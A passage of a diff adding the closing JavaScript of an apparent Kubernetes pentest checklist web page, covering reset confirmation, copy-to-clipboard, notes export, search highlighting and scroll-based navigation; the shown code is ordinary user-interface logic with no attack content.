+    const btn = document.querySelector('.danger-btn');
+    if (!clearPending) {
+      clearPending = true;
+      btn.textContent = 'CONFIRM?';
+      btn.style.background = 'rgba(255,59,107,.15)';
+      clearTimer = setTimeout(() => {
+        clearPending = false;
+        btn.textContent = 'RESET';
+        btn.style.background = '';
+      }, 2500);
+      return;
+    }
+    clearTimeout(clearTimer);
+    clearPending = false;
+    btn.textContent = 'RESET';
+    btn.style.background = '';
+    document.querySelectorAll('.check-item').forEach(el => {
+      el.classList.remove('checked');
+      el.querySelector('.check-box').textContent = '';
+    });
+    document.querySelectorAll('.notes-area').forEach(ta => {
+      ta.value = '';
+      try { localStorage.removeItem('k8s_note_' + ta.id.replace('notes-', '')); } catch(e) {}
+    });
+    try { localStorage.removeItem('k8s_checks'); } catch(e) {}
+    updateProgress();
+  }
+
+  // ── Copy button ──
+  function copyCmd(btn) {
+    const pre = btn.closest('.cmd-block').querySelector('pre');
+    const text = pre.innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      btn.textContent = 'COPIED';
+      btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1800);
+    });
+  }
+
+  // ── Export notes ──
+  function exportNotes() {
+    let out = '# KUBERNETES PENTEST NOTES EXPORT\n';
+    out += '# Generated: ' + new Date().toISOString() + '\n\n';
+    document.querySelectorAll('.section').forEach(sec => {
+      const title = sec.querySelector('.section-title')?.textContent?.trim();
+      const ta = sec.querySelector('.notes-area');
+      const checks = [...sec.querySelectorAll('.check-item.checked')]
+        .map(el => '  [x] ' + el.querySelector('.check-text').firstChild.textContent.trim());
+      if ((ta && ta.value) || checks.length) {
+        out += '## ' + title + '\n';
+        if (checks.length) out += checks.join('\n') + '\n';
+        if (ta && ta.value) out += '\n' + ta.value + '\n';
+        out += '\n';
+      }
+    });
+    const blob = new Blob([out], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'k8s-pentest-notes-' + Date.now() + '.txt';
+    a.click();
+  }
+
+  // ── Search ──
+  let origContent = {};
+  function doSearch(q) {
+    q = q.trim().toLowerCase();
+    // restore
+    document.querySelectorAll('[data-orig]').forEach(el => {
+      el.innerHTML = el.dataset.orig;
+      delete el.dataset.orig;
+    });
+    if (!q) return;
+    const targets = document.querySelectorAll('.check-text, pre, .section-title, .section-sub');
+    targets.forEach(el => {
+      if (!el.dataset.orig) el.dataset.orig = el.innerHTML;
+      const text = el.dataset.orig;
+      const regex = new RegExp('(' + q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
+      el.innerHTML = text.replace(regex, '<mark>$1</mark>');
+    });
+  }
+
+  // ── Nav active ──
+  function updateNav() {
+    const sections = document.querySelectorAll('.section');
+    const navLinks = document.querySelectorAll('nav a');
+    let current = '';
+    sections.forEach(sec => {
+      const rect = sec.getBoundingClientRect();
+      if (rect.top <= 120) current = '#' + sec.id;
+    });
+    navLinks.forEach(a => {
+      a.classList.toggle('active', a.getAttribute('href') === current);
+    });
+  }
+  window.addEventListener('scroll', updateNav, { passive: true });
+
+  // ── Init ──
+  document.addEventListener('DOMContentLoaded', () => {
+    loadNotes();
+    loadChecks();
+    updateProgress();
+    updateNav();
+  });
+</script>
+</body>
+</html>
